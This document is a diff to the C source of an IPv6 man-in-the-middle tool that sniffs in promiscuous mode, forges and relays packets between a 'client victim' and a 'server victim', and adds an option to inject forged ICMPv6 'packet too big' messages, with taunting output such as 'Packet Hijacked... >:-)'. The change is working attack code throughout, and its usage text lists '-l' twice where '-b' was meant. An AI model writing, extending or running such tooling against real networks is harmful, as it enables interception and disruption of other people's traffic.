@@ -23,6 +23,7 @@
 #define DEBUG 0
 
 int sniff;
+int opt_log, opt_verbose, opt_pkt2big;
 pthread_t pid0;
 
 void termination_handler(int signum) {
@@ -97,6 +98,7 @@ void packet_action(char *packet) {
 	struct ip6_hdr *ip6;
 	struct icmp6_hdr *icmpv6;
 	struct tcphdr *tcp;
+	char *pkt;
 
 	eth = (struct ethhdr *)packet;
 	ip6 = (struct ip6_hdr *)((char *)eth + sizeof(struct ethhdr));
@@ -104,7 +106,8 @@ void packet_action(char *packet) {
 	if (memcmp(&(eth->h_dest), &(device.hwaddr), ETH_ALEN) == 0) {
 		if (!memcmp(&(ip6->ip6_dst), &(svictim.ipv6), sizeof(struct in6_addr))) {
 			printf("Packet Hijacked from client to server? >:-)\n");
-			//debug_packet(packet);
+			if (opt_verbose)
+				debug_packet(packet);
 			fake_packet(packet, &svictim);
 			send_packet(packet);
 			/* TODO */
@@ -121,9 +124,17 @@ void packet_action(char *packet) {
 		} else if (!memcmp(&(ip6->ip6_src), &(svictim.ipv6), sizeof(struct in6_addr))) {
 			if (!memcmp(&(ip6->ip6_dst), &(cvictim->ipv6), sizeof(struct in6_addr))) {
 				printf("Packet Hijacked from server to client? >:-)\n");
+				if (opt_verbose)
+					debug_packet(packet);
+
 				fake_packet(packet, cvictim);
-				/* TODO: Enviar packet too big */
 				send_packet(packet);
+				if (opt_pkt2big) {
+					pkt = alloc_pkt2big(cvictim, &svictim);
+					send_packet(pkt);
+					if (pkt)
+						free(pkt);
+				}
 
 				/* Pacote enviado pela nossa vitima. */
 				switch (ip6->ip6_nxt) {
@@ -145,8 +156,9 @@ int main(int argc, char **argv) {
 	struct sockaddr_ll packet_info;
 	struct sigaction saction;
 	char packet_buffer[2048];
-	int len;
 	int packet_info_size = sizeof(packet_info);
+	int len, c;
+	char *iface = NULL, *address = NULL;
 
 	/* Set up the structure to specify the new action. */
 	saction.sa_handler = termination_handler;
@@ -155,16 +167,54 @@ int main(int argc, char **argv) {
 
 	sigaction(SIGINT, &saction, NULL);
 
-	if (argc < 3) {
-		printf("Usage: %s <interface> <victim's address>\n", argv[0]);
-		exit(0);
+	opt_log = 0;
+	opt_verbose = 0;
+	opt_pkt2big = 0;
+	opterr = 0;
+
+	while ((c = getopt(argc, argv, "lvbd:i:")) != -1) {
+		switch (c) {
+			case 'l':
+				opt_log = 1;
+				break;
+			case 'v':
+				/* Verbose */
+				opt_verbose = 1;
+				break;
+			case 'b':
+				opt_pkt2big = 1;
+				/* send packet too big */
+				break;
+			case 'd':
+				address = optarg;
+				break;
+			case 'i':
+				iface = optarg;
+				break;
+			case '?':
+				printf("Usage: %s -i <interface> -d <victim's address>\n" \
+						"\t-l \tLog hijacked packets\n" \
+						"\t-v \tVerbose\n" \
+						"\t-l \tSend \"packet too big\" to attacked server\n", argv[0]);
+				return 1;
+			default:
+				abort();
+		}
 	}
 
-	load_device_info(argv[1]);
+	if (!address || !iface) {
+		printf("Usage: %s -i <interface> -d <victim's address>\n" \
+				"\t-l \tLog hijacked packets\n" \
+				"\t-v \tVerbose\n" \
+				"\t-l \tSend \"packet too big\" to attacked server\n", argv[0]);
+		return 0;
+	}
+
+	load_device_info(iface);
 	dump_device_info();
 
 	sniff = get_promisc_socket(device.name);
-	init_svictim(argv[2]);
+	init_svictim(address);
 	init_cvictim();
 
 	while ((len = recvfrom(sniff, packet_buffer, 2048, 0,
